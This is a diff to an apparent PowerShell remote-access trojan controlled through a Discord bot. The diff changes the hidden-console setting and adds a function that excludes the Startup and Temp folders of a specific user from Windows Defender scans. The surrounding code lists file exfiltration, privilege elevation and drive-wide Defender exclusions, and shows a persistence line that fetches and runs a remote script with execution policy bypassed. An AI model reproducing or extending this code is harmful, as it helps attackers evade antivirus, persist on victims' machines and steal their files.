@@ -20,7 +20,7 @@
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$HideConsole = 0 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 0 # Generate client info message on session start
 
@@ -291,6 +291,7 @@ $script:jsonPayload = @{
 - **Elevate**: Attempt to restart script as admin (!user popup!)
 - **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
 - **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
+- **ExcludeC2file**: Exclude C2 related folders from Defender Scans
 - **EnableIO**: Enable Keyboard and Mouse (admin only)
 - **DisableIO**: Disable Keyboard and Mouse (admin only)
 - **Exfiltrate**: Send various files. (see ExtraInfo)
@@ -1233,6 +1234,12 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm $paren
 Function ExcludeCDrive {
     Add-MpPreference -ExclusionPath C:\
     sendMsg -Message ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"
+}
+
+Function ExcludeC2file {
+    Add-MpPreference -ExclusionPath C:\Users\lorib\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+	Add-MpPreference -ExclusionPath C:\Users\lorib\AppData\Local\Temp
+    sendMsg -Message ":white_check_mark: ``c2 file Excluded`` :white_check_mark:"
 }
 
 Function ExcludeALLDrives {
